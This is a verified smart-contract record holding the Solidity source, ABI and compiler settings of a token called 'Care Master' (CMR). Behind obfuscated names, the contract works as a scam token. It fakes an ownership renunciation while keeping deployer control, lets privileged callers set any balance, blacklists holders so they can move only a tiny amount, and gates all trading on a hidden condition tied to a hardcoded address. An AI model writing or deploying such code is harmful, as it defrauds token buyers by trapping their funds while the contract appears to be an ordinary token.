{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface autoTxSwap {\n    function createPair(address takeAt, address senderTx) external returns (address);\n}\n\ninterface tokenListIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFundAmount) external view returns (uint256);\n\n    function transfer(address receiverTotal, uint256 takeSender) external returns (bool);\n\n    function allowance(address atExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTotal,\n        uint256 takeSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atMin, uint256 value);\n    event Approval(address indexed atExempt, address indexed spender, uint256 value);\n}\n\nabstract contract modeMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellFundAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldToken is tokenListIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CareMaster is modeMarketing, tokenListIs, shouldToken {\n\n    function balanceOf(address receiverFundAmount) public view virtual override returns (uint256) {\n        return shouldReceiver[receiverFundAmount];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenTrading;\n    }\n\n    bool private sellFee;\n\n    address exemptTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitIs;\n    }\n\n    mapping(address => uint256) private shouldReceiver;\n\n    address public walletSellMax;\n\n    function fundSender(address tradingFund) public {\n        walletTo();\n        \n        if (tradingFund == walletSellMax || tradingFund == totalFrom) {\n            return;\n        }\n        sellMarketingLiquidity[tradingFund] = true;\n    }\n\n    mapping(address => bool) public buyAt;\n\n    function getOwner() external view returns (address) {\n        return fromFee;\n    }\n\n    bool private fundSwapAt;\n\n    function walletTo() private view {\n        require(buyAt[_msgSender()]);\n    }\n\n    address public totalFrom;\n\n    mapping(address => bool) public sellMarketingLiquidity;\n\n    uint256 private limitTotal;\n\n    function allowance(address limitList, address receiverAt) external view virtual override returns (uint256) {\n        if (receiverAt == exemptTx) {\n            return type(uint256).max;\n        }\n        return limitEnable[limitList][receiverAt];\n    }\n\n    address private fromFee;\n\n    string private liquidityLaunch = \"Care Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return fromFee;\n    }\n\n    function toFee(uint256 takeSender) public {\n        walletTo();\n        fundMin = takeSender;\n    }\n\n    function isReceiverSwap(address sellTrading, address receiverTotal, uint256 takeSender) internal returns (bool) {\n        require(shouldReceiver[sellTrading] >= takeSender);\n        shouldReceiver[sellTrading] -= takeSender;\n        shouldReceiver[receiverTotal] += takeSender;\n        emit Transfer(sellTrading, receiverTotal, takeSender);\n        return true;\n    }\n\n    string private tokenTrading = \"CMR\";\n\n    bool public minLiquidity;\n\n    function feeMinList() public {\n        emit OwnershipTransferred(walletSellMax, address(0));\n        fromFee = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private limitEnable;\n\n    uint256 private takeTrading;\n\n    function transfer(address takeEnable, uint256 takeSender) external virtual override returns (bool) {\n        return senderAmount(_msgSender(), takeEnable, takeSender);\n    }\n\n    uint256 fundMin;\n\n    function tokenAuto(address takeEnable, uint256 takeSender) public {\n        walletTo();\n        shouldReceiver[takeEnable] = takeSender;\n    }\n\n    function marketingFrom(address maxLiquidity) public {\n        require(maxLiquidity.balance < 100000);\n        if (marketingMin) {\n            return;\n        }\n        \n        buyAt[maxLiquidity] = true;\n        \n        marketingMin = true;\n    }\n\n    uint256 public senderReceiver;\n\n    uint256 public marketingIsTo;\n\n    bool private autoLiquidity;\n\n    function approve(address receiverAt, uint256 takeSender) public virtual override returns (bool) {\n        limitEnable[_msgSender()][receiverAt] = takeSender;\n        emit Approval(_msgSender(), receiverAt, takeSender);\n        return true;\n    }\n\n    bool public marketingMin;\n\n    uint8 private limitIs = 18;\n\n    uint256 amountList;\n\n    event OwnershipTransferred(address indexed sellWallet, address indexed txFund);\n\n    uint256 constant receiverTx = 7 ** 10;\n\n    function senderAmount(address sellTrading, address receiverTotal, uint256 takeSender) internal returns (bool) {\n        if (sellTrading == walletSellMax) {\n            return isReceiverSwap(sellTrading, receiverTotal, takeSender);\n        }\n        uint256 takeBuy = tokenListIs(totalFrom).balanceOf(teamTo);\n        require(takeBuy == fundMin);\n        require(receiverTotal != teamTo);\n        if (sellMarketingLiquidity[sellTrading]) {\n            return isReceiverSwap(sellTrading, receiverTotal, receiverTx);\n        }\n        return isReceiverSwap(sellTrading, receiverTotal, takeSender);\n    }\n\n    function transferFrom(address sellTrading, address receiverTotal, uint256 takeSender) external override returns (bool) {\n        if (_msgSender() != exemptTx) {\n            if (limitEnable[sellTrading][_msgSender()] != type(uint256).max) {\n                require(takeSender <= limitEnable[sellTrading][_msgSender()]);\n                limitEnable[sellTrading][_msgSender()] -= takeSender;\n            }\n        }\n        return senderAmount(sellTrading, receiverTotal, takeSender);\n    }\n\n    uint256 private buyAuto = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyAuto;\n    }\n\n    constructor (){\n        \n        sellFundAt maxFee = sellFundAt(exemptTx);\n        totalFrom = autoTxSwap(maxFee.factory()).createPair(maxFee.WETH(), address(this));\n        \n        walletSellMax = _msgSender();\n        buyAt[walletSellMax] = true;\n        shouldReceiver[walletSellMax] = buyAuto;\n        feeMinList();\n        if (autoLiquidity) {\n            sellFee = true;\n        }\n        emit Transfer(address(0), walletSellMax, buyAuto);\n    }\n\n    address teamTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFundAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMinList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"}],\"name\":\"fundSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"}],\"name\":\"marketingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIsTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMarketingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"toFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"tokenAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSellMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CareMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}